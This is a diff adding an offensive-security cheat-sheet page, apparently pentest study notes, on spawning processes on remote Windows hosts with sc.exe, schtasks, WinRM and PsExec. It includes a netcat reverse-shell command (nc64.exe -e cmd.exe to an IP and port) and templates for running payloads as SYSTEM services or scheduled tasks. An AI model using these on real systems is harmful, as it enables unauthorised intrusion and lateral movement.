@@ -1,0 +1,163 @@
+---
+sidebar_label: Spawning Processes Remotely
+hide_title: true
+---
+
+
+## Spawning Processes Remotely
+
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+
+:::danger Required Privileges: `Administrators`
+
+```batch
+:: Remote Procedure Call
+135/TCP  49152-65535/TCP (DCE/RPC)
+
+:: [NETBIOS] RPC over SMB Named Pipes
+139/TCP 
+445/TCP 
+```
+
+:::
+
+
+**`Windows Services`** can also be leveraged to run arbitrary commands since they execute a command when started. While a Service executable is technically different from a Regular Application, if we configure a Windows Service to run any application, it will still execute it and **Fail Afterwards.**
+
+<br/>
+
+
+
+We can create a **Service** on a Remote Host with <b style={{ color: 'MediumTurquoise' }}>sc.exe</b> which is a <b>Standard Tool</b> available in Windows. When using <b>sc</b>, it will try to connect to the Service <b style={{ color: 'DeepSkyBlue' }}>Control Manager (SVCCTL)</b> Remote Service Program through <b style={{ color: 'Coral' }}>RPC</b>.
+
+<br/>
+
+
+### Running as Another User
+
+```batch
+:: Spawning a Shell as [Another User] [Running Commands as the Other User]
+runas /netonly /user:DOMAIN\USERNAME "c:\tools\nc64.exe -e cmd.exe IP PORT"
+```
+
+
+<br/>
+
+
+
+### Creating Services
+
+```powershell
+# Creating
+sc \\TARGET create SERVICE_NAME binPath= "Command/PAYLOAD To Run" start= auto
+```
+
+```powershell
+# Start - Stop - Delete
+sc \\TARGET start  "SERVICE_NAME"
+sc \\TARGET stop   "SERVICE_NAME"
+sc \\TARGET delete "SERVICE_NAME"
+```
+
+<br/>
+
+### Creating Scheduled Tasks
+
+```batch
+:: Creating
+schtasks /s TARGET /RU "SYSTEM" /create /tn "TASK_NAME" /tr "Command/PAYLOAD To Run" /sc ONCE /sd 01/01/2024 /st 00:00
+```
+
+```batch
+:: Running
+schtasks /s TARGET /run /TN "TASK_NAME" 
+
+:: List Tasks 
+tasklist /v 
+
+:: Delete Tasks
+schtasks /s TARGET /TN "TASK_NAME" /DELETE /F
+```
+
+
+<br/>
+
+
+## Remote Process Creation Using WinRM
+
+:::caution Required Group Memberships: `Remote Management Users`
+
+```batch
+:: Windows Remote Management
+Ports: 5985/TCP (HTTP)  5986/TCP (HTTPS)
+```
+
+:::
+
+
+**`Windows Remote Management` (WinRM)** is a Web-Based Protocol used to send Powershell Commands to Windows Hosts remotely. Most Windows Server Installations will have WinRM enabled by Default.
+
+
+<Tabs>
+  <TabItem value="one" label="CMD"> 
+    <p>
+
+```batch
+:: Create Interactive Session
+winrs -u:USERNAME -p:PASSWORD -r:TARGET cmd
+```
+
+</p>
+  </TabItem>
+  <TabItem value="two" label="PSH">
+    <p>
+
+```powershell
+# Creating PSCredential Object
+$username = 'USERNAME';
+$password = 'PASSWORD';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+
+```powershell
+# Create Interactive Session [Enter-PSSession]
+Enter-PSSession -Computername TARGET -Credential $credential
+```
+
+```powershell
+# Run Commands Remotely [Invoke-Command]
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+```
+
+</p>
+  </TabItem>
+</Tabs>
+
+
+<br/>
+
+## PsExec
+
+:::danger Required Privileges: `Administrators`
+
+```batch
+:: SMB
+445/TCP
+```
+
+:::
+
+Allows an **Administrator** User to run Commands Remotely on any PC where he has Access. 
+
+
+<br/>
+
+
+```batch
+:: Accept the [Eula] otherwise the Command won't Work
+PsExec64.exe -accepteula
+PsExec64.exe \\TARGET_IP -u USERNAME -p PASSWORD -i cmd.exe
+```
